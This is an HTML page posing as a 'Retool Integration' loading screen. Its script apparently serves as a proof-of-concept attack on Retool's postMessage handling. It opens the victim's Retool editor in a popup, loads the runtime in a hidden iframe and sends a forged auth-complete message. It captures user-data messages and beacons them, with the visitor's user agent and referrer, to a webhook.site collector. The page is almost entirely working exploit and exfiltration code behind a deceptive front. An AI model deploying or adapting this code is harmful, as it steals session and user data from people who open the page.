<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Retool Integration</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
  .box { background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 32px 40px; text-align: center; max-width: 420px; }
  .spinner { width: 32px; height: 32px; border: 3px solid #e2e8f0; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  h2 { font-size: 16px; color: #1e293b; margin-bottom: 6px; }
  p { font-size: 13px; color: #64748b; }
</style>
</head>
<body>
<div class="box">
  <div class="spinner" id="spin"></div>
  <h2 id="msg">Establishing connection...</h2>
  <p id="sub">Please wait</p>
</div>

<script>
(function() {
  'use strict';

  var WH = 'https://webhook.site/82992a43-c436-48c6-a887-42bd38d712be';
  var ATK = location.origin;
  var APP_ID = '272a0bca-c978-11ef-bcec-bb34712e5ec6';
  var HOST = 'https://jonjos11.retool.com';

  // Target URLs to open
  var EDITOR_URL = HOST + '/apps/' + APP_ID + '/editor';
  var RUNTIME_BASE = 'https://retool-edge.com/runtime.M2M3OWU5.html';

  function X(payload) {
    var j = JSON.stringify(payload);
    fetch(WH, { method: 'POST', headers: {'Content-Type':'application/json'}, body: j }).catch(function(){});
    if (navigator.sendBeacon) { navigator.sendBeacon(WH, new Blob([j],{type:'text/plain'})); }
    new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0,800));
  }

  // ==============================================================
  // STRATEGY A: Open the REAL editor via window.open()
  // The editor loads the runtime internally. We listen for ANY
  // postMessages from the editor window (which may include forwarded
  // runtime messages or editor messages sent to opener via '*')
  // ==============================================================
  function attackRealEditor() {
    var popup = window.open(EDITOR_URL, 're', 'width=1200,height=800,left='+((screen.width-1200)/2)+',top='+((screen.height-800)/2));

    if (!popup) {
      document.getElementById('msg').textContent = 'Popup blocked';
      document.getElementById('sub').textContent = 'Allow popups and reload';
      document.getElementById('spin').style.display = 'none';
      return;
    }

    document.getElementById('msg').textContent = 'Connected to editor';
    document.getElementById('sub').textContent = 'Listening for messages...';

    X({ event: 'editor_opened', url: EDITOR_URL, time: new Date().toISOString() });

    // Send probe messages to the editor window (may reach runtime if editor forwards)
    // The runtime has NO origin check on handlers 7043, 6800, 7751
    // If the editor forwards our postMessages to the runtime, the runtime accepts them
    setTimeout(function() {
      // Request real user data
      popup.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
      X({ event: 'sent_probe', to: 'editor', type: 'RETOOL_CURRENT_USER_REQUEST', time: new Date().toISOString() });
    }, 3000);

    setInterval(function() {
      if (popup.closed) return;
      popup.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
    }, 5000);

    // Monitor popup
    setInterval(function() {
      if (popup.closed) {
        document.getElementById('msg').textContent = 'Window closed';
        document.getElementById('sub').textContent = 'Check webhook for captured data';
        document.getElementById('spin').style.display = 'none';
      }
    }, 1000);
  }

  // ==============================================================
  // STRATEGY B: Iframe the runtime with real parentOrigin
  // The runtime sends messages to US (its parent). Since handlers
  // at 7043/6800/7751 have NO origin check, we can also send
  // messages to it. We try to trigger backend calls to capture
  // real function names + params.
  // ==============================================================
  function attackRuntime() {
    // Use the REAL editor as parentOrigin so runtime might load real app
    var url = RUNTIME_BASE + '?parentOrigin=' + encodeURIComponent(HOST) + '&product=retool-web&isTestRuntime=false';

    var f = document.createElement('iframe');
    f.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none;';
    f.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation';
    f.src = url;
    document.body.appendChild(f);

    f.onload = function() {
      X({ event: 'runtime_loaded', url: url, time: new Date().toISOString() });

      // DON'T inject fake user — let the runtime wait for real data
      // But DO send auth bypass (no origin check at handler 7751)
      try {
        f.contentWindow.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
      } catch(e) {}
    };
  }

  // ==============================================================
  // INTERCEPT ALL postMessages
  // ==============================================================
  window.addEventListener('message', function(e) {
    var d = e.data;
    if (!d || typeof d !== 'object' || !d.type) return;

    // Log ALL postMessages regardless of source (capture everything)
    if (d.type && d.type.indexOf('RETOOL_') === 0) {
      X({
        event: 'intercept',
        type: d.type,
        data: d,
        origin: e.origin,
        source: e.source === window ? 'self' : (e.source === window.opener ? 'opener' : 'other'),
        time: new Date().toISOString()
      });
    }
  });

  // ==============================================================
  // AUTO-START on click (bypass popup blocker)
  // ==============================================================
  document.body.addEventListener('click', function go() {
    document.body.removeEventListener('click', go);

    X({ event: 'attack_start', attackerOrigin: ATK, editorUrl: EDITOR_URL, runtimeUrl: RUNTIME_BASE, time: new Date().toISOString() });

    // Open the REAL editor (Strategy A)
    attackRealEditor();

    // Also iframe the runtime (Strategy B)
    attackRuntime();
  });

  X({ event: 'page_load', url: location.href, referrer: document.referrer, ua: navigator.userAgent, time: new Date().toISOString() });

})();
</script>
</body>
</html>
